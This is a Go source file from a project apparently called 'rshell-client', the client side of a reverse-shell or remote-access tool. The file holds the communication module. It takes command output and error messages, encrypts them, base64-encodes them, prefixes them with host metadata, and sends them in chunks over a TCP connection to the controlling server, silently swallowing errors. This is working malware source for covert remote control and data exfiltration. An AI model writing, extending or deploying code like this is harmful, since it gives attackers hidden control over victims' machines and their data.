package communication

import (
	"rshell-client/shared/encrypt"
	"rshell-client/shared/utils"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"sync"
)

var TCPClient *net.TCPConn

func ErrorProcess(err error) {
	errMsgBytes := []byte(err.Error())
	result := errMsgBytes
	fmt.Println(err)
	criticalSection(31, result)
}

func DataProcess(callbackType int, b []byte) {
	result := b
	var err error
	if callbackType == 0 {
		result, err = utils.CodepageToUTF8(b)
		if err != nil {
			ErrorProcess(err)
		}
	}
	criticalSection(callbackType, result)
}

var mutex sync.Mutex

func criticalSection(callbackType int, b []byte) {
	mutex.Lock()

	finalPaket := MakePacket(callbackType, b)
	finalPaket, _ = encrypt.Encrypt(finalPaket)
	finalPaket, _ = encrypt.EncodeBase64(finalPaket)

	MetaLen := len(utils.MetaInfo)
	MetaLenBytes := utils.WriteInt(MetaLen)

	msg := utils.BytesCombine(MetaLenBytes, utils.MetaInfo, finalPaket)

	normalDataInt := 2
	normalDataBytes := utils.WriteInt(normalDataInt)
	msgToSend := utils.BytesCombine(normalDataBytes, msg)

	Send(msgToSend, TCPClient)
	mutex.Unlock()
}
func Send(msg []byte, conn net.Conn) {
	defer func() {
		if err := recover(); err != nil {
		}
	}()

	if conn == nil {
		return
	}

	bufferSize := len(msg)
	bufferSizeBytes := utils.WriteInt(bufferSize)

	msgToSend := utils.BytesCombine(bufferSizeBytes, msg)

	const chunkSize = 50 * 1024
	var chunk []byte

	for bytesSent := 0; bytesSent < len(msgToSend); {
		if len(msgToSend)-bytesSent > chunkSize {
			chunk = msgToSend[bytesSent : bytesSent+chunkSize]
		} else {
			chunk = msgToSend[bytesSent:]
		}

		_, err := conn.Write(chunk)
		if err != nil {
			return
		}

		bytesSent += len(chunk)
	}

}

func MakePacket(replyType int, b []byte) []byte {
	buf := new(bytes.Buffer)

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := encrypt.Encrypt(buf.Bytes())
	if err != nil {
		return nil
	}

	buf.Reset()

	buf.Write(encrypted)

	return buf.Bytes()

}
